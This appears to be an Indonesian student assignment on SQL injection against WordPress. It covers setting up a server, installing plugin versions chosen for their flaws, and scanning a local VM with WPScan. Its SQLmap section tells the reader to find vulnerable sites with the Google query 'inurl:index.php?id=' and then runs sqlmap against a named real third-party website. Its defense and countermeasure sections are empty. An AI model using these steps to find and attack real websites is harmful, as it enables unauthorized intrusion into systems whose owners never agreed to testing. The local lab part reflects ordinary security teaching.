## Tugas 2

### Pendahuluan
Pada Tugas 2 kami akan mencoba penetrasi aplikasi web berbasis wordpress dengan memanfaatkan beberapa plugin yang vulnerable atau berpotensi untuk diserang dengan teknik SQL Injection. Dalam percobaan yang kami lakukan kami menggunakan beberapa tool untuk mencoba SQL Injection.

### Dasar Teori
#### SQL Injection
SQL Injection merupakan teknik mengeksploitasi aplikasi web yang didalamnya menggunakan database untuk penyimpanan data.  Aksi hacking / attacking dengan SQL injection dapat dilakukan pada aplikasi client ketika ketika masukan pengguna tidak disaring secara benar dari karakter-karakter pelolos bentukan string yang diimbuhkan dalam pernyataan SQL atau masukan pengguna tidak bertipe kuat dan karenanya dijalankan tidak sesuai harapan.

#### Ubuntu Server
#### Wordpress
#### SqlMap
#### WPScan

### Uji Penetrasi
#### install apache2
```bash
sudo apt-get install apache2 apache2-utils
sudo systemctl enable apache2
sudo systemctl start apache2
```

#### install mysql
```bash
sudo apt-get install mysql-client mysql-server
sudo mysql-secure-isntallation
```

#### install php and modules
```bash
sudo apt-get install php7.0 php7.0-mysql libapache2-mod-php7.0 php7.0-cli php7.0-cgi php7.0-gd  
sudo nano /var/www/html/info.php buat ngetes
```

#### install wordpress cms
```bash
wget -c http://wordpress.org/latest.tar.gz
tar -xzvf latest.tar.gz
```

```bash
sudo rsync -av wordpress/* /var/www/html/
```

```bash
sudo chown -R www-data:www-data /var/www/html/
$ sudo chmod -R 755 /var/www/html/
```

#### create wordpress database

```bash
mysql -u root -p
mysql> CREATE DATABASE wp_myblog;
mysql> GRANT ALL PRIVILEGES ON wp_myblog.* TO 'your_username_here'@'localhost' IDENTIFIED BY 'your_chosen_password_here';
mysql> FLUSH PRIVILEGES;
mysql> EXIT;

sudo mv wp-config-sample.php wp-config.php
```
ubah wp-config.php sesuai database
```bash
sudo systemctl restart apache2.service 
sudo systemctl restart mysql.service 
```
buka localhost/wp-admin/setup-config.php
buat user
login

#### install plugin
```bash
cd /var/www/html/wp-content/plugins
sudo wget -c https://downloads.wordpress.org/plugin/player.1.5.16.zip
sudo wget -c https://downloads.wordpress.org/plugin/leaguemanager.3.9.1.1.zip

sudo apt-get install unzip

sudo unzip player.1.5.16.zip
sudo unzip leaguemanager.3.9.1.1.zip
```

buka halaman wordpressnya, login
pilih plugins, installed plugins
aktifkan plugins yang sudah diinstall

#### WPSCAN
Install file yang dibutuhkan
```bash
sudo apt-get install git
sudo apt-get install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev
```

Clone git project wpscan
```bash
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
sudo gem install bundler && bundle install --without test development
```

Jalankan menggunakan ruby
```bash
unzip data.zip
ruby wpscan.rb -u 192.168.56.103 --enumerate vp
```
#### SQLmap
Clone git project sqlmap
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Cari website yang vulnerable melalui google dengan cara
```bash
inurl:index.php?id=
```

Jalankan sqlmap menggunakan python
```bash
cd sqlmap
python sqlmap.py -u 'http://www.icdcprague.org/index.php?id=10'
```

### Kesimpulan

#### Defense

#### Countermeasure